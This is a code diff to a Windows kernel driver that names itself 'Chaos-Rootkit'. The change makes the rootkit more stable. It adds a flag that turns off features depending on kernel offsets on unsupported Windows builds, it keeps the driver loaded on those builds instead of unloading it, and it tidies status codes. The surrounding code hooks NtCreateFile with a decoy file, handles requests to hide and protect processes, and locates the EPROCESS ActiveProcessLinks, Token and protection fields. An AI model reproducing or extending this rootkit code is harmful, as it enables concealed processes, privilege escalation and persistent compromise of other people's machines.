@@ -49,6 +49,8 @@ typedef struct x_hooklist {
     int takeCopy;
     int pID;
     wchar_t filename[MAX_PATH];
+
+    BOOL check_off;
     UNICODE_STRING decoyFile;
 
 
@@ -293,12 +295,12 @@ DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option)
         hooklist_s->pID == rfileinfo.rpid)
     {
         DbgPrint("Hook already active for function 1\n");
-        return (STATUS_UNSUCCESSFUL);
+        return (STATUS_ALREADY_EXISTS);
     }
     else if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile2 && Option == 2)
     {
         DbgPrint("Hook already active for function 2\n");
-        return (STATUS_UNSUCCESSFUL);
+        return (STATUS_ALREADY_EXISTS);
     }
 
     if (Option == 1)
@@ -322,7 +324,7 @@ DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option)
     return (0);
 }
 
-DWORD InitializeStructure(Phooklist hooklist_s)
+NTSTATUS InitializeStructure(Phooklist hooklist_s)
 {
     if (!hooklist_s )
     {
@@ -659,8 +661,17 @@ NTSTATUS processIoctlRequest(
 
     int pstatus = 0;
     int inputInt = 0;
+
     __try
     {
+        // if system offsets not supported / disable features 
+        // that require the use of offsets to avoid crash
+        if (  pstack->Parameters.DeviceIoControl.IoControlCode >= HIDE_PROC && \
+            pstack->Parameters.DeviceIoControl.IoControlCode <= UNPROTECT_ALL_PROCESSES && xHooklist.check_off)
+        {
+            pstatus = ERROR_UNSUPPORTED_OFFSET;
+            __leave;
+        }
         switch (pstack->Parameters.DeviceIoControl.IoControlCode)
         {
             case HIDE_PROC:
@@ -939,7 +950,7 @@ void IRP_MJClose()
 }
 
 
-DWORD InializeOffsets() {
+DWORD InializeOffsets(Phooklist hooklist) {
     DWORD dwOffset = 0;
     RTL_OSVERSIONINFOW pversion;
 
@@ -994,9 +1005,13 @@ DWORD InializeOffsets() {
     }
 
     if (eoffsets.ActiveProcessLinks_offset && eoffsets.Token_offset && eoffsets.protection_offset)
+    {
+        xHooklist.check_off = 0;
         return (STATUS_SUCCESS);
-
+    }
     DbgPrint("Unsupported Windows build %lu. Please open an issue in the repository", pversion.dwBuildNumber);
+
+    xHooklist.check_off = 1; // block features that requires offsets
 
     return (STATUS_UNSUCCESSFUL);
 }
@@ -1009,17 +1024,21 @@ DriverEntry(
     PUNICODE_STRING registryPath
 )
 {
-
+  
     DbgPrint("Chaos-Rootkit Loaded ...\n");
 
     ExInitializePushLock(&pLock);
-
+    NTSTATUS status;
     UNREFERENCED_PARAMETER(registryPath);
     UNREFERENCED_PARAMETER(driverObject);
 
-    InitializeStructure(&xHooklist);
+    if (!NT_SUCCESS(status = InitializeStructure(&xHooklist)))
+    {
+        DbgPrint(("Failed to create device object (0x%08X)\n", status));
+        return (STATUS_UNSUCCESSFUL);
+    }
 
-    NTSTATUS status = IoCreateDevice(driverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, METHOD_BUFFERED, FALSE, &driverObject->DeviceObject);
+    status = IoCreateDevice(driverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, METHOD_BUFFERED, FALSE, &driverObject->DeviceObject);
 
     if (!NT_SUCCESS(status))
     {
@@ -1036,11 +1055,11 @@ DriverEntry(
         return (STATUS_UNSUCCESSFUL);
     }
 
-    if (InializeOffsets())
+    if (InializeOffsets(&xHooklist))
     {
         DbgPrint("unsupported windows build !\n");
-        unloadv(driverObject);
-        return (STATUS_UNSUCCESSFUL);
+        //unloadv(driverObject);
+        //return (STATUS_UNSUCCESSFUL);
     }
 
     DbgPrint("offsets initialized\n");
